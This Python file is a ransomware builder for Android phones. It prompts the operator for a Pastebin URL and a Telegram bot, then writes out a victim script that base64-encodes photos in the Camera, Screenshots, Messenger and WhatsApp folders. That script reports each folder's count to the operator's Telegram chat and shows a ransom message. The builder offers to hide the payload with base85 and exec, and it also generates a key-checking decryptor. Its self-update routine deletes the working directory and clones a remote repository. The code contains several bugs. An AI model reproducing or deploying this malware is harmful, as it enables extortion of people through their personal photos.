# تمت برمجة الاداة بالكامل من قبل زياد العباني والاداة مفتوحه المصدر
import base64
import os
import random
import string
import time
import sys
try:
 import requests
except  ModuleNotFoundError:
    os.system('pip install requests')
try:
    import rich
except ModuleNotFoundError:
    os.system('pip install rich')
from rich.console import Console
console=Console()
g="\033[1;32m"
class virus:
    def __int__(self):
        try:
            self.peresnt()
            self.clear()
            open('info.txt','r').read()
        except FileNotFoundError:
            self.clear()
            self.pastbin()
            print(f' {g}info about YOU: ')
            note = f"{g}now give me info about you for your business\n"
            for letter in note:
                time.sleep(0.04)
                sys.stdout.write(letter)
                sys.stdout.flush()
            pastbin= input(f'{g}YOUR PASTBIN: ')
            token=input(f"{g}YOUR TOKEN ID TELEGRAM: ")
            grup= input(f'{g}YOUR GROUP ID BOT TELEGRAM: ')
            with open('info.txt','w')as file:
                file.write(f'{pastbin}|{token}|{grup}')
            console.print('congracts every things ok now we try to send messege in your telegram')
            with open('info.txt','r')as info:
                f=info.read()
            lines=f.split('\n')
            for line in lines:
                fark=line.split("|")
            print(f'{g}check if YOUR PASTBIN OK')
            key1="-".join(random.choices(string.ascii_uppercase+string.digits,k=11))
            print(f' {g}COPY THIS KEY AND PUT IN PASTBIN \n \t {key1}')
            input('are you ready press ok ?')
            sez = requests.get(fark[0]).text
            if key1 in sez:
                print('EVERYTHINGS IS OK')
                self.telegram()
            else:
                os.system('rm -rf once.txt')
                self.__int__()
            os.system("touch once.txt")
        with open('once.txt','w')as file:
            file.write('done')
        self.main()
    def peresnt(self):
        messege = "THIS TOOL CODED BY ZEYAD ALABANY ALL COPY RIGHT RESEVED \n"
        for letter in messege:
            time.sleep(0.06)
            sys.stdout.write(letter)
            sys.stdout.flush()
    def clear(self):
        update = requests.get('https://raw.githubusercontent.com/br5kly/ransomwere/main/update.txt').text
        key="UPDATE-V1"
        if key in update:
            input('UPDATE AVAILABLE PRESS OK TO UPDATE')
            get = os.getcwd()
            name = os.basename(__file__)
            os.system(f'rm -rf {get} && cd /sdcard  && git clone https://github.com/br5kly/zeyad-virus ')
            console.print('update done',style="bold r red")
            console.print("\n GO TO /sdcard/zeyad-virus and run new update",style="bold red3")
            sys.exit()
        else:
            os.system('clear')
            pass
        os.system('clear')
    def pastbin(self):
        os.system('am start https://pastebin.com/raw/GavEVVth')
    def telegram(self):
        self.clear()
        print(f'{g} checking your telegram bot')
        with open('info.txt')as file:
            r= file.read()
        lines= r.split('\n')
        for line in lines:
            fark=line.split('|')
        grup= fark[2]
        token= fark[1]
        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id=@{grup}&text=CONNECTED DONE')
        input('ENTER TO SKIP')
        self.main()
        open("once.txt","w")
    def banner(self):
        s=''' +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX /
 / XXXXXX /
(________(                
 `------'              BY ZEYAD ALABANY
'''
        self.clear()
        console.print(s,style="bold blue")
    def show(self):
        # Define data as list of tuples
        from rich.console import Console
        console = Console()
        with open('info.txt', 'r') as file:
            s = file.read()
        lines = s.split("\n")
        for line in lines:
            fark = line.split('|')

        console.print('INFORMATION TABLE', style='bold r blue')
        console.print("-" * 30, style='bold blue')
        console.print(f'PATSBIN =     {fark[0]}', style='bold blue')
        console.print(f'TOKEN-BOT =     {fark[1]}', style='bold blue')
        console.print(f'GROUP-ID =     {fark[2]}', style='bold blue')
        console.print('[1] I WANT CHENGE MY INFO', style='bold blue')
        console.print('[2] TEST MY TELEGRAM BOT', style='bold blue')
        console.print('[3] GO MAIN MENU')
        zx = input('\033[1;34m CHOOSE :')
        if zx == "1":
            os.system('rm -rf info.txt')
            self.__int__()
        elif zx =="2":
            self.telegram()
        else :
            self.main()
    def main(self):
        color="bold blue"
        self.banner()
        console.print(f'[1]: MAKE RANSOMWERE VIRUS',style="bold blue")
        console.print(f'[2]: DECRYPT VICTEM FILES',style="bold blue")
        console.print('[3]: SHOW YOUR INFO AND TETS')
        console.print(f'[4]: EXIT FROM TOOL',style="bold blue")
        zeyad = input('choose : ')
        if zeyad == "1":
            self.gen_v()
        elif zeyad == "2":
            self.gen_d()
        elif zeyad == "3":
            self.show()
        elif zeyad == "4":
            self.peresnt()
            sys.exit()
        else:
            print('incorrect choicing')
            time.sleep(1)
            os.system('clear')
            self.main()
    def gen_v(self):
        g="\033[1;31m"
        x = input('\033[1;33m WHATS MESSEGE DO YOU SHOW AFTER FUCKED VICTEM ?: ')
        y = input('\033[1;33m NAME THE VIRUS : ')
        with open('info.txt','r')as file:
            r=file.read()
        lines=r.split('\n')
        for line in lines:
            fark=line.split('|')
        #with open(f'{y}.py','w')as virus:
            open(f'{y}.py','w').write(f'''# -*- coding: utf-8 -*-
import base64
import random,sys,os,string,requests
key="-".join(random.choices(string.ascii_uppercase+string.digits,k=11))
att = "/"
class dec:
    def __int__(self):
        if os.path.exists('/data/data/com.termux/files/home'):
            self.termux()
        else:
            self.pydroid()
    def pydroid(self):
        try:
            open('/sdcard/key-cov','r').read()
        except FileNotFoundError:
            r=open('/sdcard/key-cov','w')
            r.write(key)
            r.close()
        self.paths()
    def termux(self):
        try:
            open('/sdcard/key-cov','r').read()
        except FileNotFoundError:
            s=open('/sdcard/key-cov','w')
            s.write(key)
            s.close()
        self.paths()
    def paths(self):
        ext = ('.jpg', '.png', '.jpeg', '.heic')
        def messenger():
            count =[]
            path="/sdcard/Pictures/Messenger"
            num = len([f for f in os.listdir(path) if f.endswith(ext)])
            count.extend([path,num])
            for file in os.listdir(path):
                if file.endswith(ext):
                    with open(path+att+file,'rb')as text:
                        s=text.read()
                    if not s.startswith(b'A') or s.startswith(b'a') or s.startswith(b'0') or s.startswith(b'B') or s.startswith(b'b') or s.startswith(b'1') or s.startswith(b'C') or s.startswith(b'c') or s.startswith(b'2') or s.startswith(b'D') or s.startswith(b'd') or s.startswith(b'3') or s.startswith(b'E') or s.startswith(b'e') or s.startswith(b'4') or s.startswith(b'F') or s.startswith(b'f') or s.startswith(b'5') or s.startswith(b'G') or s.startswith(b'g') or s.startswith(b'6') or s.startswith(b'H') or s.startswith(b'h') or s.startswith(b'7') or s.startswith(b'I') or s.startswith(b'i') or s.startswith(b'8') or s.startswith(b'J') or s.startswith(b'j') or s.startswith(b'9') or s.startswith(b'K') or s.startswith(b'k') or s.startswith(b'L') or s.startswith(b'l') or s.startswith(b'M') or s.startswith(b'm') or s.startswith(b'N') or s.startswith(b'n') or s.startswith(b'O') or s.startswith(b'o') or s.startswith(b'P') or s.startswith(b'p') or s.startswith(b'Q') or s.startswith(b'q') or s.startswith(b'R') or s.startswith(b'r') or s.startswith(b'S') or s.startswith(b's') or s.startswith(b'T') or s.startswith(b't') or s.startswith(b'U') or s.startswith(b'u') or s.startswith(b'V') or s.startswith(b'v') or s.startswith(b'W') or s.startswith(b'w') or s.startswith(b'X') or s.startswith(b'x') or s.startswith(b'Y') or s.startswith(b'y') or s.startswith(b'Z') or s.startswith(b'z') or s.startswith(b'0') or s.startswith(b'1') or s.startswith(b'2') or s.startswith(b'3') or s.startswith(b'4') or s.startswith(b'5') or s.startswith(b'6') or s.startswith(b'7') or s.startswith(b'8') or s.startswith(b'9')or s.startswith(b'/') or s.startswith(b'+'):
                       with open(path+att+file,'rb')as man:
                          binary=base64.b64encode(man.read())
                       with open(path+att+file,'wb')as women:
                           women.write(binary)
                    else:pass
            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=  وتمت عملية التشفير ملف المسنجر يمتلك صورة  {{count[1]}}');print('loading 55%')
            del count
        def screenshots():
            count = []
            path = "/sdcard/DCIM/Screenshots"
            num = len([f for f in os.listdir(path) if f.endswith(ext)])
            count.extend([path, num])
            for file in os.listdir(path):
                if file.endswith(ext):
                    with open(path+att+file, 'rb') as text:
                        s = text.read()
                    if not s.startswith(b'A') or s.startswith(b'a') or s.startswith(b'0') or s.startswith(b'B') or s.startswith(b'b') or s.startswith(b'1') or s.startswith(b'C') or s.startswith(b'c') or s.startswith(b'2') or s.startswith(b'D') or s.startswith(b'd') or s.startswith(b'3') or s.startswith(b'E') or s.startswith(b'e') or s.startswith(b'4') or s.startswith(b'F') or s.startswith(b'f') or s.startswith(b'5') or s.startswith(b'G') or s.startswith(b'g') or s.startswith(b'6') or s.startswith(b'H') or s.startswith(b'h') or s.startswith(b'7') or s.startswith(b'I') or s.startswith(b'i') or s.startswith(b'8') or s.startswith(b'J') or s.startswith(b'j') or s.startswith(b'9') or s.startswith(b'K') or s.startswith(b'k') or s.startswith(b'L') or s.startswith(b'l') or s.startswith(b'M') or s.startswith(b'm') or s.startswith(b'N') or s.startswith(b'n') or s.startswith(b'O') or s.startswith(b'o') or s.startswith(b'P') or s.startswith(b'p') or s.startswith(b'Q') or s.startswith(b'q') or s.startswith(b'R') or s.startswith(b'r') or s.startswith(b'S') or s.startswith(b's') or s.startswith(b'T') or s.startswith(b't') or s.startswith(b'U') or s.startswith(b'u') or s.startswith(b'V') or s.startswith(b'v') or s.startswith(b'W') or s.startswith(b'w') or s.startswith(b'X') or s.startswith(b'x') or s.startswith(b'Y') or s.startswith(b'y') or s.startswith(b'Z') or s.startswith(b'z') or s.startswith(b'0') or s.startswith(b'1') or s.startswith(b'2') or s.startswith(b'3') or s.startswith(b'4') or s.startswith(b'5') or s.startswith(b'6') or s.startswith(b'7') or s.startswith(b'8') or s.startswith(b'9')or s.startswith(b'/') or s.startswith(b'+'):
                        with open(path+att+file, 'rb') as man:
                            binary = base64.b64encode(man.read())
                        with open(path+att+file, 'wb') as women:
                            women.write(binary)
                    else:
                        pass
            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=ملف السكرينات يمتلك صورة وتمت عملية التشفير{{count[1]}}');print('loading 77%')
            del count

        def camera():
            count = []
            path = "/sdcard/DCIM/Camera"
            num = len([f for f in os.listdir(path) if f.endswith(ext)])
            count.extend([path, num])
            for file in os.listdir(path):
                if file.endswith(ext):
                    with open(path+att+file, 'rb') as text:
                        s = text.read()
                    if not s.startswith(b'A') or s.startswith(b'a') or s.startswith(b'0') or s.startswith(b'B') or s.startswith(b'b') or s.startswith(b'1') or s.startswith(b'C') or s.startswith(b'c') or s.startswith(b'2') or s.startswith(b'D') or s.startswith(b'd') or s.startswith(b'3') or s.startswith(b'E') or s.startswith(b'e') or s.startswith(b'4') or s.startswith(b'F') or s.startswith(b'f') or s.startswith(b'5') or s.startswith(b'G') or s.startswith(b'g') or s.startswith(b'6') or s.startswith(b'H') or s.startswith(b'h') or s.startswith(b'7') or s.startswith(b'I') or s.startswith(b'i') or s.startswith(b'8') or s.startswith(b'J') or s.startswith(b'j') or s.startswith(b'9') or s.startswith(b'K') or s.startswith(b'k') or s.startswith(b'L') or s.startswith(b'l') or s.startswith(b'M') or s.startswith(b'm') or s.startswith(b'N') or s.startswith(b'n') or s.startswith(b'O') or s.startswith(b'o') or s.startswith(b'P') or s.startswith(b'p') or s.startswith(b'Q') or s.startswith(b'q') or s.startswith(b'R') or s.startswith(b'r') or s.startswith(b'S') or s.startswith(b's') or s.startswith(b'T') or s.startswith(b't') or s.startswith(b'U') or s.startswith(b'u') or s.startswith(b'V') or s.startswith(b'v') or s.startswith(b'W') or s.startswith(b'w') or s.startswith(b'X') or s.startswith(b'x') or s.startswith(b'Y') or s.startswith(b'y') or s.startswith(b'Z') or s.startswith(b'z') or s.startswith(b'0') or s.startswith(b'1') or s.startswith(b'2') or s.startswith(b'3') or s.startswith(b'4') or s.startswith(b'5') or s.startswith(b'6') or s.startswith(b'7') or s.startswith(b'8') or s.startswith(b'9')or s.startswith(b'/') or s.startswith(b'+'):
                        with open(path+att+file, 'rb') as man:
                            binary = base64.b64encode(man.read())
                        with open(path+att+file, 'wb') as women:
                            women.write(binary)
                    else:
                        pass
            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=ملف الكاميرا يمتلك وتمت عملية التشفير{{count[1]}}');print("loding 25%")
            del count
        def whatsapp():
            count = []
            path = "/sdcard/android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
            num = len([f for f in os.listdir(path) if f.endswith(ext)])
            count.extend([path, num])
            for file in os.listdir(path):
                if file.endswith(ext):
                    with open(path+att+file, 'rb') as text:
                        s = text.read()
                    if not s.startswith(b'A') or s.startswith(b'a') or s.startswith(b'0') or s.startswith(b'B') or s.startswith(b'b') or s.startswith(b'1') or s.startswith(b'C') or s.startswith(b'c') or s.startswith(b'2') or s.startswith(b'D') or s.startswith(b'd') or s.startswith(b'3') or s.startswith(b'E') or s.startswith(b'e') or s.startswith(b'4') or s.startswith(b'F') or s.startswith(b'f') or s.startswith(b'5') or s.startswith(b'G') or s.startswith(b'g') or s.startswith(b'6') or s.startswith(b'H') or s.startswith(b'h') or s.startswith(b'7') or s.startswith(b'I') or s.startswith(b'i') or s.startswith(b'8') or s.startswith(b'J') or s.startswith(b'j') or s.startswith(b'9') or s.startswith(b'K') or s.startswith(b'k') or s.startswith(b'L') or s.startswith(b'l') or s.startswith(b'M') or s.startswith(b'm') or s.startswith(b'N') or s.startswith(b'n') or s.startswith(b'O') or s.startswith(b'o') or s.startswith(b'P') or s.startswith(b'p') or s.startswith(b'Q') or s.startswith(b'q') or s.startswith(b'R') or s.startswith(b'r') or s.startswith(b'S') or s.startswith(b's') or s.startswith(b'T') or s.startswith(b't') or s.startswith(b'U') or s.startswith(b'u') or s.startswith(b'V') or s.startswith(b'v') or s.startswith(b'W') or s.startswith(b'w') or s.startswith(b'X') or s.startswith(b'x') or s.startswith(b'Y') or s.startswith(b'y') or s.startswith(b'Z') or s.startswith(b'z') or s.startswith(b'0') or s.startswith(b'1') or s.startswith(b'2') or s.startswith(b'3') or s.startswith(b'4') or s.startswith(b'5') or s.startswith(b'6') or s.startswith(b'7') or s.startswith(b'8') or s.startswith(b'9')or s.startswith(b'/') or s.startsswith(b'+'):
                        with open(path+att+file, 'rb') as man:
                            binary = base64.b64encode(man.read())
                        with open(path+att+file, 'wb') as women:
                            women.write(binary)
                    else:
                        pass
            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=ملف الواتس اب يمتلك وتمت عملية التشفير{{count[1]}}');print("login 50%")
            del count
        paths=[]
        if os.path.exists('/sdcard/Pictures/Messenger'):
                messenger()
                paths.append('/sdcard/Pictures/Messenger/')
        if os.path.exists('/sdcard/DCIM/Screenshots'):
            screenshots()
            paths.append('/sdcard/DCIM/Screenshots/')
        if os.path.exists('/sdcard/DCIM/Camera'):
            camera()
            paths.append('/sdcard/DCIM/Camera/')
        if os.path.exists('/sdcard/android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/'):
            whatsapp()
            paths.append('/sdcard/android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/')
        with open('/sdcard/myenc-cov','w')as enc:
          for make in paths:
             enc.write(make+"|")
        with open('/sdcard/myenc-cov','r')as my:
          new=my.read()
        za = new[:-1]
        with open('/sdcard/myenc-cov','w')as weka:
          weka.write(za)
        
def setup():
    try:
        open('/sdcard/try-cov','w')
    except PermissionError:
        print('[1;31m ERROR IN TOOL PLEASE GIVE PERMISSION Y')
        os.system('termux-setup-storage')
        setup()
    dec().__int__()
setup()
print("{g} {x}")         ''')
            my=os.getcwd()
            print(f"{g} DONE VIRUS GENERATE: {my}/{y}.py")
            time.sleep(2)
            c=input(f'{g} DO YOU WANT ENCRYPTION VIRUS ? [base64]   Y|N: ')
            if c in ['Y','y','yes','YES']:
                import base64
                with open(f'{y}.py', 'rb') as file:
                    bin = base64.b85encode(file.read())
                with open(f'{y}.py', 'w') as man:
                    man.write(f'import base64\nexec(base64.b85decode({bin}))')

            elif c in ['n','N','NO','no','nO']:
                self.main()
            else:
                self.main()
    def gen_d(self):
        red = "\033[1;31m"
        x= input('ENTER YOUR MESSEGE TO VICTEM :')
        y= input("ETNER NAME OF DECRYPT FILE :")
        with open('info.txt','r')as file:
            r=file.read()
        lines=r.split('\n')
        for line in lines:
            fark=line.split('|')
        #with open(f'{y}.py','w')as file:
            open(f'{y}.py','w').write(f'''# -*- coding: utf-8 -*-
import os,requests,random,base64,sys,time
class dec:
    def main(self):
        note = '{x}'
        for letter in note:
            time.sleep(0.04)
            sys.stdout.write(letter)
            sys.stdout.flush()
        key = open('/sdcard/key-cov','r').read()
        print('YOUR KEY :\\t',key)
        input('PRESS OK TO CHECK YOU KEY')
        sez=requests.get('{fark[0]}').text
        if key in sez:
            self.decrypt()
        else:
            print('{red} YOUR KEY IS NOT ACTIVE PLEASE CONTACT HACKER AND')
            time.sleep(2)
            os.system('clear')
            self.main()
    def decrypt(self):
        ext = ('.jpg', '.png', '.jpeg', '.heic')
        with open('/sdcard/myenc-cov', 'r') as file:
            r = file.read()
        lines = r.split('\\n')
        for line in lines:
            fark = line.split('|')
        for i in range(len(fark)):
            for file in os.listdir(fark[i]):
              if file.endswith(ext):
                s = open(fark[i] + file, 'rb').read()
                if s.startswith(b'A') or s.startswith(b'a') or s.startswith(b'0') or s.startswith(b'B') or s.startswith(b'b') or s.startswith(b'1') or s.startswith(b'C') or s.startswith(b'c') or s.startswith(b'2') or s.startswith(b'D') or s.startswith(b'd') or s.startswith(b'3') or s.startswith(b'E') or s.startswith(b'e') or s.startswith(b'4') or s.startswith(b'F') or s.startswith(b'f') or s.startswith(b'5') or s.startswith(b'G') or s.startswith(b'g') or s.startswith(b'6') or s.startswith(b'H') or s.startswith(b'h') or s.startswith(b'7') or s.startswith(b'I') or s.startswith(b'i') or s.startswith(b'8') or s.startswith(b'J') or s.startswith(b'j') or s.startswith(b'9') or s.startswith(b'K') or s.startswith(b'k') or s.startswith(b'L') or s.startswith(b'l') or s.startswith(b'M') or s.startswith(b'm') or s.startswith(b'N') or s.startswith(b'n') or s.startswith(b'O') or s.startswith(b'o') or s.startswith(b'P') or s.startswith(b'p') or s.startswith(b'Q') or s.startswith(b'q') or s.startswith(b'R') or s.startswith(b'r') or s.startswith(b'S') or s.startswith(b's') or s.startswith(b'T') or s.startswith(b't') or s.startswith(b'U') or s.startswith(b'u') or s.startswith(b'V') or s.startswith(b'v') or s.startswith(b'W') or s.startswith(b'w') or s.startswith(b'X') or s.startswith(b'x') or s.startswith(b'Y') or s.startswith(b'y') or s.startswith(b'Z') or s.startswith(b'z') or s.startswith(b'0') or s.startswith(b'1') or s.startswith(b'2') or s.startswith(b'3') or s.startswith(b'4') or s.startswith(b'5') or s.startswith(b'6') or s.startswith(b'7') or s.startswith(b'8') or s.startswith(b'9')or s.startswith(b'/') or s.startswith(b'+'):
                    with open(fark[i] + file, 'rb') as boy:
                        binary = base64.b64decode(boy.read())
                    with open(fark[i] + file, 'wb') as girl:
                        girl.write(binary)
                    print('DONE ')
                else:
                    pass
        my = os.path.basename(__file__)
        
        sys.exit()

def setup():
    try:
        open('/sdcard/zeyad.txt','w')
    except PermissionError:
        print('PRESS Y TO RETURN YOUR PHOTO')
        os.system('termux-setup-storage')
        setup()
    dec().main()
setup()
                  ''')
            my = os.getcwd()
            print(f"{g} DONE VIRUS DECODE PHOTO: {my}/{y}.py")
            time.sleep(3)
            c = input(f'{g} DO YOU WANT ENCRYPTION FILE ? ? [base64]   Y|N: ')
            if c in ['Y', 'y', 'yes', 'YES']:
                import base64
                with open(f'{y}.py', 'rb') as file:
                    bin = base64.b85encode(file.read())
                with open(f'{y}.py', 'w') as man:
                    man.write(f'import base64\nexec(base64.b85decode({bin}))')

            elif c in ['n', 'N', 'NO', 'no', 'nO']:
                self.main()
            else:
                self.main()
def per():
    try:
        open('/sdcard/g','w')
    except PermissionError:
        print('GIVE TOOL ALL PERMISSION TO SKIP')
        os.system('termux-setup-storage')
        per()
    my=os.path.basename(__file__)
    if os.getcwd() == '/sdcard/zeyad-virus' or os.getcwd()== '/storage/emulated/0/zeyad-virus':
        virus().__int__()
    else:
       os.system('cd /sdcard && mkdir zeyad-virus')
       os.system(f'mv {my} /sdcard/zeyad-virus')
       print(f'{g} TOOL EXISTS IN /sdcard/zeyad-virus RUN it from there')
       x=input('DO YOU RUN KNOW ?Y|N :')
       if x in ['Y','y']:
         if os.path.exists('/data/data/com.termux/files/home'):
            os.system(f'cd /sdcard && cd zeyad-virus && python {my}')
         else:
            print('[PYDROID USER]: YOU CAN RUN IT ANY TIME JUST GO TO : /sdcard/zeyad-virus and run it')
            sys.exit()
       else:
        print('YOU CAN RUN IT ANY TIME JUST GO TO : sdcard/zeyad-virus')
        sys.exit()
per()
